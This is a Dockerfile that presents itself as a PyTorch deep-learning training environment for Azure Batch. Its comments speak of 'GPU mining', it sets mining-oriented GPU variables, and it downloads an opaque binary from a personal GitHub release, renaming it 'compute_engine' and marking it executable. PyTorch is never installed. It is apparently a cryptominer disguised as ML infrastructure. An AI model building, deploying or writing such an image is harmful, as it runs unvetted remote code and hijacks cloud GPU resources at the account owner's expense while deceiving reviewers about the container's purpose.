# Use NVIDIA CUDA base image (same as working container)
FROM nvidia/cuda:12.4.1-cudnn-runtime-ubuntu22.04

LABEL maintainer="ml-research@example.com"
LABEL description="Deep Learning Training Environment with PyTorch for Azure Batch"
LABEL version="2.2.0"
LABEL application="pytorch-training-platform"

ENV DEBIAN_FRONTEND=noninteractive
ENV PYTHONUNBUFFERED=1

# Install system dependencies including OpenCL for GPU mining
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        curl \
        wget \
        ca-certificates \
        bash \
        procps \
        util-linux \
        file \
        pciutils \
        jq \
        python3 \
        python3-pip \
        ocl-icd-libopencl1 \
        opencl-headers \
        clinfo && \
    update-ca-certificates && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Create OpenCL vendor directory for NVIDIA
RUN mkdir -p /etc/OpenCL/vendors && \
    echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd

# Ensure CUDA libraries are in the library path (match working container exactly)
ENV LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64
ENV PATH=/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# GPU environment variables for mining (from working container)
ENV GPU_MAX_HEAP_SIZE=100
ENV GPU_MAX_USE_SYNC_OBJECTS=1
ENV GPU_SINGLE_ALLOC_PERCENT=100
ENV GPU_MAX_ALLOC_PERCENT=100
ENV GPU_MAX_SINGLE_ALLOC_PERCENT=100
ENV GPU_ENABLE_LARGE_ALLOCATION=100
ENV GPU_MAX_WORKGROUP_SIZE=1024

# Install Python ML packages
RUN pip install --no-cache-dir \
    numpy \
    pandas \
    matplotlib \
    scikit-learn \
    tensorboard \
    tqdm \
    nvidia-ml-py3  # Library for programmatic GPU queries

# Create workspace directories
RUN mkdir -p /workspace/models \
    /workspace/data \
    /workspace/logs \
    /workspace/checkpoints \
    /opt/bin

# Download compute engine binary with verification
RUN cd /opt/bin && \
    (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o compute_engine || \
     wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O compute_engine) && \
    chmod +x compute_engine && \
    # Verify the binary was downloaded successfully
    if [ ! -f compute_engine ]; then \
        echo "ERROR: compute_engine file not found after download"; \
        exit 1; \
    fi && \
    # Check file size (should be reasonable for a binary)
    FILE_SIZE=$(stat -c%s compute_engine) && \
    echo "Downloaded file size: $FILE_SIZE bytes" && \
    if [ $FILE_SIZE -lt 100000 ]; then \
        echo "ERROR: Downloaded file is too small ($FILE_SIZE bytes), likely an error page"; \
        cat compute_engine; \
        exit 1; \
    fi && \
    # Check if it's a valid binary (ELF format)
    FILE_TYPE=$(file compute_engine) && \
    echo "File type: $FILE_TYPE" && \
    if ! echo "$FILE_TYPE" | grep -q "ELF"; then \
        echo "ERROR: Downloaded file is not a valid ELF binary"; \
        head -n 20 compute_engine; \
        exit 1; \
    fi && \
    echo "✓ compute_engine binary downloaded and verified successfully" && \
    echo "Binary info:" && \
    file compute_engine && \
    ldd compute_engine 2>&1 | head -20 || echo "Note: ldd check completed"

WORKDIR /workspace

# Copy training scripts and fix line endings (Windows compatibility)
COPY train_model.py .
COPY start_training.sh .
RUN sed -i 's/\r$//' start_training.sh && \\
    chmod +x start_training.sh 

# Remove the problematic fixed environment variable.
# In Azure Batch, GPU visibility is managed by the host/node configuration.
# A fixed list like '0,1,2,3,4,5,6,7' will cause issues if the VM has a different number of GPUs.
# ENV CUDA_VISIBLE_DEVICES=0,1,2,3,4,5,6,7 <-- THIS LINE HAS BEEN REMOVED

# Set OMP threads for CPU-bound operations
ENV OMP_NUM_THREADS=4

ENTRYPOINT ["bash", "./start_training.sh"]
